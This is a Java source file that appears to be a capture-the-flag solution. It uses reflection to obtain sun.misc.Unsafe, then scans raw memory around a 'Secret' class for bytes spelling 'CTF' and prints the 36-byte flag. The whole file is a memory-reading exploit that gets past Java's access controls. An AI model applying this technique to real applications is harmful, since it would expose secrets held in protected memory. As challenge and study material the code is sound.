import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Arrays;

import sun.misc.Unsafe;

public class JSBP4 {
    public static void main(String[] args) throws Exception {
        Field unsafeField = Unsafe.class.getDeclaredField("theUnsafe");
        unsafeField.setAccessible(true);
        Unsafe unsafe = (Unsafe) unsafeField.get(null);

        Class c = Class.forName("Secret");
        Method m = c.getDeclaredMethod("getFlag");
        m.invoke(c.newInstance());

        long ioff = 1;

        // int hit = 0;
        long start = -1;
        for (long i = -100; i < 100000; i++) {
            int x = unsafe.getByte(c, i), y = unsafe.getByte(c, i + ioff), z = unsafe.getByte(c, i + ioff * 2);
            // if (x == 252 && y == 235 && z == 249) {
            if (x == 67 && y == 84 && z == 70) {
                // hit = 36;
                start = i;
                break;
            }

            // if (hit > 0) {
            //     System.out.printf("off: %d, v: %d\n", i, x);
            //     hit--;
            // }

            // boolean work = true;
            // for (int j = 0; j < 36; j++) {
            //     int v = unsafe.getInt(c, i + j * ioff);
            //     work &= v < 256;
            // }
            // work &= x == 252;
            // boolean work = x == 67;
            // boolean work = x == 67 && y == 84 && z == 70;
            // boolean work = x == 252 && y == 

            // if (work) {
            //     start = i;
            //     break;
            // }
        }

        if (start == -1) {
            System.exit(0);
        }

        // System.out.println("Start: " + start);

        byte[] flag = new byte[36];
        for (int i = 0; i < 36; i++) {
            flag[i] = unsafe.getByte(c, start);
            start += ioff;
        }

        String fflag = new String(flag);
        System.out.println(fflag);
    }
}